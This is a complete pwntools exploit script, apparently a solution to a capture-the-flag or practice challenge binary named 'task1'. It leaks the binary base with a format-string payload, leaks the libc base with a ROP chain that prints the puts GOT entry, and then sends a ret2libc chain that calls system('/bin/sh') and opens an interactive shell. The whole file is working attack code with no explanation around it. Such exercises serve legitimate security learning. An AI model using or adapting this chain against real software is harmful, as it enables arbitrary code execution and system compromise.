from pwn import *
from pwn import p64,u64

context.log_level="error"
pros = process("./task1")                                 
elf  = ELF("./task1")         
rop = ROP("./task1")
libc_elf = ELF("/lib/x86_64-linux-gnu/libc.so.6")

# PART 1 ( BINARY BASE ADDRESS LIKAGE )

pros.recvuntil(b"here : \n")

payload = b"%49$p"

pros.sendline(payload)

addr = int(pros.recvline().strip(),16)
binary_addr = addr - elf.symbols["_start"]  

print(hex(binary_addr))

# PART 2 ( LIBC BASE ADDRESS LIKAGE )

junk = b"A" * 0x78
getinput_addr = binary_addr + elf.symbols["getInput"]
rdi_addr = binary_addr + rop.find_gadget(["pop rdi","ret"]).address
puts_plt = binary_addr + elf.symbols["puts"]
puts_got = binary_addr + elf.got["puts"]

payload = junk
payload += p64(rdi_addr)
payload += p64(puts_got)
payload += p64(puts_plt)
payload += p64(getinput_addr)

pros.sendline(payload)
addr1 = pros.recvline().strip().ljust(8,b"\x00")
addr1 = u64(addr1)

libc_base_addr = addr1 - libc_elf.symbols["puts"]
print(hex(libc_base_addr))
# ------------------------------------------------------------------------

payload = b"A" * 20
pros.sendline(payload)
pros.recvline()

# PART 3 ( CALLING LIBRARY FUNCTION (SYSTEM) TO POP-UP SHELL )

sh_addr = libc_base_addr + next(libc_elf.search(b"/bin/sh"))
system_addr = libc_base_addr + libc_elf.symbols["system"]
ret_addr = binary_addr +rop.find_gadget(["ret"]).address
exit_addr = libc_base_addr + libc_elf.symbols["exit"]

payload = junk
payload += p64(rdi_addr)
payload += p64(sh_addr)
payload += p64(ret_addr)
payload += p64(system_addr)
payload += p64(exit_addr)

pros.sendline(payload)
pros.recvline()
pros.interactive()
